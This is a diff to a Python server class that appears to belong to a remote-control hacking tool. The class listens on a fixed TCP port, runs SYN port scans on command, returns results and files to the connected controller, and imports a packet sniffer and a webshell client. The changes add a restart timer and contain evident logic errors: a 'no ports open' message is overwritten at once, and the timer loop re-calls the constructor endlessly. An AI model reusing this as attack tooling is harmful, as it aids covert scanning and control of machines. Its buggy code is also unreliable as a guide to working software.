@@ -6,9 +6,7 @@ import PACKET_SNIFFER as snf
 from PortScanner import PortScanner
 from Webshell_Client import Client
 from helper_methods import *
-
 import requests
-
 
 class Server(Thread):
     def __init__(self, IP: str, target_ip: str):
@@ -21,7 +19,8 @@ class Server(Thread):
         print('[+] Listening for income TCP connection on port 16549')
         self.conn, self.addr = self.conn.accept()
         print('[+]We got a connection from', self.addr)
-
+        self.start_time = time.time()
+        self.timer = Thread(target=self.check_time).start()
         self.run()
 
     def run(self) -> None:
@@ -46,9 +45,12 @@ class Server(Thread):
                 continue
             elif msg == 'SYN_SRT':
                 open_ports = PortScanner(get_ip_address()).SYN_Scan_Wrap()
+                if open_ports == []:
+                    st = 'No TCP ports are open'
                 st = ''
                 for open_port in open_ports:
                     st += f"Port {open_port} is open!" + '\n'
+
                 self.conn.send(str(len(st)).encode('ISO-8859-1', errors='ignore'))
                 self.conn.send(st.encode('ISO-8859-1', errors='ignore'))
                 continue
@@ -87,6 +89,11 @@ class Server(Thread):
         else:
             self.conn.send('File not found'.encode('ISO-8859-1', errors='ignore'))
 
+    def check_time(self):
+        while True:
+            if time.time() - self.start_time > 120:
+                self.conn.shutdown(socket.SHUT_RDWR)
+                self.__init__(self.IP, self.target_ip)
 
 def main():
     server = Server('10.0.0.11', '10.0.0.11')
